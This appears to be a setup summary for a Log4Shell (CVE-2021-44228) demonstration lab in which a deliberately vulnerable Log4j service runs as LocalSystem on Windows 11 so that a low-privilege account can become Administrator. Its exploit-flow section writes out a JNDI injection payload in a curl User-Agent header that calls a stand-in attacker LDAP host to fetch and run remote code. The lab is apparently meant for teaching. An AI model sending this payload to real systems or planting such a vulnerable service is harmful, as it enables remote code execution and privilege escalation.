# Log4Shell Demo Setup - Executive Summary

## What We're Building

A **Log4Shell (CVE-2021-44228)** demonstration environment on your Windows 11 system that allows the low-privilege `sshguest` account to gain Administrator privileges through a critical CISA Known Exploited Vulnerability.

## The Strategy

Instead of trying to exploit your fully-patched Windows 11 OS (which would be nearly impossible), we're **installing vulnerable software** that contains the Log4Shell vulnerability:

1. **Install Java 8** with vulnerable **Log4j 2.14.0** logging library
2. **Create a simple HTTP server** that logs user input (vulnerable to injection)
3. **Run it as a Windows service** with LocalSystem privileges
4. **Demonstrate exploitation** where low-privilege user becomes admin

## Why This Approach Works

✅ **Realistic**: Many organizations still run vulnerable Log4j versions  
✅ **High Impact**: Service runs as LocalSystem (highest Windows privilege)  
✅ **Easy to Demo**: Single HTTP request triggers the exploit  
✅ **CISA Relevant**: CVE-2021-44228 is #4 on the Known Exploited Vulnerabilities list  
✅ **Safe**: Controlled environment, benign payload, your own system  

## The Exploit Flow

```
1. sshguest sends: curl -H "User-Agent: ${jndi:ldap://attacker:1389/Exploit}" http://localhost:8080
2. Vulnerable Java app logs the User-Agent string
3. Log4j processes the ${jndi:ldap://...} lookup
4. Connects to attacker's LDAP server
5. LDAP server redirects to HTTP server hosting Exploit.class
6. Java downloads and executes Exploit.class AS LOCALSYSTEM
7. Exploit adds sshguest to Administrators group
8. sshguest now has admin privileges!
```

## Files Provided

- **`log4shell_setup.py`** - Automated setup script (run as admin)
- **`LOG4SHELL_INSTRUCTIONS.md`** - Detailed step-by-step instructions  
- **`SETUP_SUMMARY.md`** - This overview document

## Quick Start

1. Copy `log4shell_setup.py` to your Windows machine
2. SSH as `sshadmin` and run: `python log4shell_setup.py`  
3. Follow the demonstration steps in the instructions
4. Watch `sshguest` become admin through a single HTTP request!

## Why Log4Shell for CISA KEV Demo

**CVE-2021-44228** is perfect for this demonstration because:

- **Critical Severity**: CVSS 10.0/10 
- **Real World Impact**: Caused emergency patching across the internet in Dec 2021
- **Simple Exploitation**: Just one HTTP request with special header
- **Widespread Vulnerability**: Affected millions of Java applications
- **Clear Privilege Escalation**: Low-privilege user → System admin

This shows exactly why vulnerabilities end up on the CISA KEV list - they're actively exploited, have severe impact, and are relatively easy to exploit once discovered.